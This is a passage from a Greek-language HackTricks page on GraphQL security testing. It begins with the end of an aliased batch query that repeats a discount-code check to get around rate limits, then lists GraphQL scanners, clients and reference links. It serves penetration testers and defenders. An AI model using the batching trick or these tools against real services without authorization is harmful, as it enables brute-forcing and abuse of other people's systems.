isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Εργαλεία

### Σαρωτές ευπαθειών

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Δοκιμή κοινών κακοδιαρθρώσεων των graphql endpoints
* [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Σενάριο ελέγχου ασφαλείας GraphQL με έμφαση στην εκτέλεση ομαδικών ερωτημάτων και μεταλλάξεων GraphQL.
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Αναγνώριση του graphql που χρησιμοποιείται
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Εργαλειοθήκη που μπορεί να χρησιμοποιηθεί για την απόκτηση σχημάτων και αναζήτηση ευαίσθητων δεδομένων, δοκιμή εξουσιοδότησης, βίαιη δύναμη σχημάτων και εύρεση διαδρομών σε έναν δεδομένο τύπο.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Μπορεί να χρησιμοποιηθεί ως αυτόνομο εργαλείο ή [Burp extension](https://github.com/doyensec/inql).
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Μπορεί να χρησιμοποιηθεί και ως CLI client για την αυτοματοποίηση επιθέσεων
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Εργαλείο που απαριθμεί τους διαφορετικούς τρόπους **πρόσβασης σε έναν δεδομένο τύπο σε ένα σχήμα GraphQL**.
* [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Ο διάδοχος των Αυτόνομων και CLI Λειτουργιών του InQL
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Burp extension για προηγμένο έλεγχο GraphQL. Ο _**Σαρωτής**_ είναι ο πυρήνας του InQL v5.0, όπου μπορείτε να αναλύσετε ένα GraphQL endpoint ή ένα τοπικό αρχείο σχήματος introspection. Δημιουργεί αυτόματα όλα τα πιθανά ερωτήματα και τις μεταλλάξεις, οργανώνοντάς τα σε μια δομημένη προβολή για την ανάλυσή σας. Το _**Συστατικό Επιθέτη**_ σας επιτρέπει να εκτελείτε ομαδικές επιθέσεις GraphQL, οι οποίες μπορεί να είναι χρήσιμες για την παράκαμψη κακώς υλοποιημένων περιορισμών ρυθμού.
* [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Προσπαθήστε να αποκτήσετε το σχήμα ακόμη και με την introspection απενεργοποιημένη χρησιμοποιώντας τη βοήθεια ορισμένων βάσεων δεδομένων Graphql που θα προτείνουν τα ονόματα των μεταλλάξεων και των παραμέτρων.

### Πελάτες

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI client
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Client

### Αυτόματες Δοκιμές

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* Βίντεο που εξηγεί το AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Αναφορές

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
